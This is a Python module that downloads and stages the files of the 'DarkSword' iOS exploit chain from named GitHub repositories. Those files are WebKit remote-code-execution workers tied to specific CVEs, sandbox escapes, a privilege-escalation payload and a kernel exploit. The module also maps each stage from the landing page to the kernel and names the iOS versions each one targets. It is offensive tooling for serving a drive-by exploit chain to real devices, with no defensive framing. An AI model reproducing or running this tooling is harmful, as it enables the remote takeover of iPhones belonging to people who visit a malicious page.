"""Payload management - sync from repos and list."""

import httpx
from pathlib import Path
from typing import List, Tuple, Optional

from .config import get_payloads_dir, PROJECT_ROOT

RCE_PAYLOADS = [
    "index.html",
    "frame.html",
    "rce_loader.js",
    "rce_module.js",
    "rce_module_18.6.js",
    "rce_worker.js",
    "rce_worker_18.6.js",
    "sbx0_main_18.4.js",
    "sbx1_main.js",
    "pe_main.js",
]

RCE_BASE_URLS = [
    "https://raw.githubusercontent.com/htimesnine/DarkSword-RCE/main/",
    "https://raw.githubusercontent.com/ghh-jb/DarkSword/main/",
]

KEXPLOIT_FILES = [
    "Makefile",
    "README.md",
    "entitlements.plist",
    "src/main.m",
]
KEXPLOIT_BASE = "https://raw.githubusercontent.com/opa334/darksword-kexploit/main/"


def fetch_payload(
    name: str,
    base_url: Optional[str] = None,
    base_urls: Optional[List[str]] = None,
) -> Tuple[bool, str]:
    """Fetch a single payload file. Usa base_url ou lista base_urls (fallback entre repos)."""
    urls = [base_url] if base_url else (base_urls if base_urls is not None else RCE_BASE_URLS)
    last_err = ""
    for base in urls:
        if not base:
            continue
        url = f"{base.rstrip('/')}/{name}"
        try:
            with httpx.Client(timeout=30.0) as client:
                resp = client.get(url)
                if resp.status_code == 200:
                    return True, resp.text
                last_err = f"HTTP {resp.status_code}"
        except Exception as e:
            last_err = str(e)
    return False, last_err


def sync_payloads(force: bool = False) -> dict:
    """
    Sync payload files from DarkSword-RCE repo.
    Returns dict with success/fail counts and details.
    rce_worker.js is also copied to rce_worker_18.4.js (loader expects it for iOS 18.4).
    """
    payloads_dir = get_payloads_dir()
    results = {"success": [], "failed": [], "skipped": []}

    for name in RCE_PAYLOADS:
        dest = payloads_dir / name
        if dest.exists() and not force:
            results["skipped"].append(name)
            continue

        ok, data = fetch_payload(name, base_urls=RCE_BASE_URLS)
        if ok:
            dest.write_text(data, encoding="utf-8")
            results["success"].append(name)
            if name == "rce_worker.js":
                alt = payloads_dir / "rce_worker_18.4.js"
                if not alt.exists() or force:
                    alt.write_text(data, encoding="utf-8")
                    if "rce_worker_18.4.js" not in results["success"]:
                        results["success"].append("rce_worker_18.4.js")
        else:
            results["failed"].append((name, data))

    return results


def sync_kexploit(force: bool = False) -> dict:
    """
    Sincroniza arquivos do kernel exploit (opa334/darksword-kexploit).
    Objective-C - compila no macOS com Xcode/SDK iOS.
    """
    kexploit_dir = PROJECT_ROOT / "kexploit"
    kexploit_dir.mkdir(parents=True, exist_ok=True)
    results = {"success": [], "failed": [], "skipped": []}

    for name in KEXPLOIT_FILES:
        dest = kexploit_dir / name
        if dest.exists() and not force:
            results["skipped"].append(name)
            continue

        ok, data = fetch_payload(name, base_url=KEXPLOIT_BASE)
        if ok:
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_text(data, encoding="utf-8")
            results["success"].append(name)
        else:
            results["failed"].append((name, data))

    return results


def list_payloads() -> List[Path]:
    """List available payload files in the payloads directory."""
    payloads_dir = get_payloads_dir()
    return sorted(payloads_dir.glob("*")) if payloads_dir.exists() else []


def get_payload_info() -> dict:
    """Get info about payload structure and iOS version support."""
    return {
        "chain": "DarkSword",
        "description": "iOS WebKit RCE + PE exploit chain (18.4 - 18.7)",
        "stages": [
            ("index.html", "Landing page - loads frame.html in iframe"),
            ("frame.html", "Loader frame - injects rce_loader.js"),
            ("rce_loader.js", "Main loader - fetches RCE modules by iOS version"),
            ("rce_module.js", "RCE module for iOS 18.4"),
            ("rce_module_18.6.js", "RCE module for iOS 18.6"),
            ("rce_worker_18.4.js", "WebWorker exploit - iOS 18.4 (CVE-2025-31277)"),
            ("rce_worker_18.6.js", "WebWorker exploit - iOS 18.6 (CVE-2025-43529)"),
            ("sbx0_main_18.4.js", "Sandbox escape - iOS 18.4"),
            ("sbx1_main.js", "Sandbox escape stage 1"),
            ("pe_main.js", "Privilege escalation payload"),
        ],
        "ios_versions": ["18.4", "18.5", "18.6", "18.6.1", "18.6.2", "18.7"],
        "references": [
            "https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain",
            "https://github.com/htimesnine/DarkSword-RCE",
            "https://github.com/ghh-jb/DarkSword",
            "https://github.com/opa334/darksword-kexploit",
        ],
        "not_in_repos": [
            "rce_worker_18.7.js - citado no blog Google para iOS 18.7, nao publicado",
        ],
    }
